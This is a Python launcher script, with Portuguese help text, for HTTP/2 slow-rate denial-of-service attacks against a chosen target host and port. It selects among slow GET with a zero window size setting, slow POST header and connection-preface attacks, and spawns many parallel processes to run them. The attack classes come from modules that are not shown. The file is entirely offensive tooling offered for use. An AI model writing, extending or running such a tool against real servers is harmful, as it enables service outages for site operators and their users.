#!/bin/python3

import argparse
import time
from multiprocessing import Process
from tls_connection import TLSConnection
from slow_rate_attacks import NormalGet, CompleteGetHeaderZeroSettingInitialWindowSize, CompletePostHeader, ConnectionPrefaceAttack

def run_attack(target, port, path, attack_type):
    tls_connection = TLSConnection(target, port)
    tls_sock = tls_connection.establish_connection()

    if attack_type == 'normal_get':
        attack = NormalGet(tls_sock, target, path)
    elif attack_type == 'complete_get_header_zero_setting_initial_window_size':
        attack = CompleteGetHeaderZeroSettingInitialWindowSize(tls_sock, target, path)
    elif attack_type == 'complete_post_header':
        attack = CompletePostHeader(tls_sock)
    elif attack_type == 'connection_preface':
        attack = ConnectionPrefaceAttack(tls_sock)
    
    attack.initiate_attack()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Execute um ataque Slow POST ou Prefácio de Conexão usando HTTP/2.")
    parser.add_argument('-t', '--target', type=str, required=True, help="Endereço IP ou hostname do alvo.")
    parser.add_argument('-p', '--port', type=int, default=443, help="Porta do alvo (padrão: 443).")
    parser.add_argument('--path', type=str, default="/", help="Caminho do alvo (padrão: '/').")
    parser.add_argument('--attack_type', type=str, choices=['normal_get', 'complete_get_header_zero_setting_initial_window_size', 'complete_post_header', 'connection_preface'], required=True, help="Tipo de ataque a ser realizado.")
    parser.add_argument('-P', '--process', type=int, default=1, help="Número de processos para spawnar (padrão: 1).")
    parser.add_argument('-d', '--delay', type=float, default=0.1, help="Delay entre processos em segundos (padrão: 0.1).")

    args = parser.parse_args()

    process_list = []
    for _ in range(args.process):
        process = Process(target=run_attack, args=(args.target, args.port, args.path, args.attack_type), daemon=True)
        process_list.append(process)
        process.start()
        time.sleep(args.delay)

    for process in process_list:
        if process.is_alive():
            process.join()

